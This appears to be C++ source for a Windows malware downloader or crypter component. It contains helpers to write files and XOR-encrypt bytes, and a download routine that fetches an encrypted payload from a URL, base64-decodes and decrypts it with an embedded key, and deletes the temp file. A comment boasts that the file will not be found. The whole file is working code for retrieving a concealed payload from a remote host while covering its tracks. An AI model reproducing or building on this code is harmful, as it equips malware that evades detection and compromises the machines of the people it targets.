
#include "encryption.h"


int clone_file(char* path, PVOID buffer, DWORD size)
{
	HANDLE hFile;
	BOOL bErrorFlag = FALSE;
	DWORD dwBytesWritten;
	hFile = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("Terminal failure: Unable to open file \"%s\" for write.\n", path);
		return 0;
	}
	printf("Writing %d bytes to %s.\n", size, path);
	bErrorFlag = WriteFile(hFile, buffer, size, &dwBytesWritten, NULL);
	if (FALSE == bErrorFlag)
	{
		printf("Terminal failure: Unable to write to file.\n");
		return 0;
	}
	else
	{
		if (dwBytesWritten != size)
		{
			printf("Error: dwBytesWritten != dwBytesToWrite\n");
			return 0;
		}
		else
		{
			printf("Wrote %d bytes to %s successfully.\n", dwBytesWritten, path);
		}
	}
	CloseHandle(hFile);
	return 1;
}
std::vector < BYTE > crypt(std::vector < BYTE > &inp, std::vector < BYTE > &key)
{
	std::vector < BYTE > ret;
	ret.reserve(inp.size());
	std::vector < BYTE >::const_iterator kI = key.begin();
	for (std::vector < BYTE >::const_iterator iI = inp.begin(); iI != inp.end(); ++iI)
	{
		ret.push_back(*iI ^ *kI);
		if (++kI == key.end())
			kI = key.begin();
	}
	return ret;
}
std::string getTempFile(char* prefix)
{
	CHAR temppath[MAX_PATH];
	GetTempPathA(MAX_PATH, temppath);
	CHAR filename[MAX_PATH];
	GetTempFileNameA(temppath, prefix, 0, filename);
	return std::string(filename);
}
std::vector < BYTE > readFile(std::string filename)
{
	std::streampos fileSize;
	std::ifstream file(filename, std::ios::binary);
	file.seekg(0, std::ios::end);
	fileSize = file.tellg();
	file.seekg(0, std::ios::beg);
	std::vector < BYTE > fileData(fileSize);
	file.read((char*)&fileData[0], fileSize);
	return fileData;
}
std::vector < BYTE > downl(char* url)
{
	std::string filename = getTempFile("DL");
	std::vector < BYTE > crypted_bytes;
	std::vector < BYTE > decrypted_bytes;
	URLDownloadToFileA(NULL, url, filename.c_str(), NULL, NULL);
	std::vector <BYTE> tmp = readFile(filename);
	crypted_bytes = base64_decode(std::string((char *)&tmp[0], tmp.size()));
	decrypted_bytes = crypt(crypted_bytes, std::vector < BYTE >(KEY));
	DeleteFileA(filename.c_str()); //sure i will not find it -.....
	return decrypted_bytes;
}






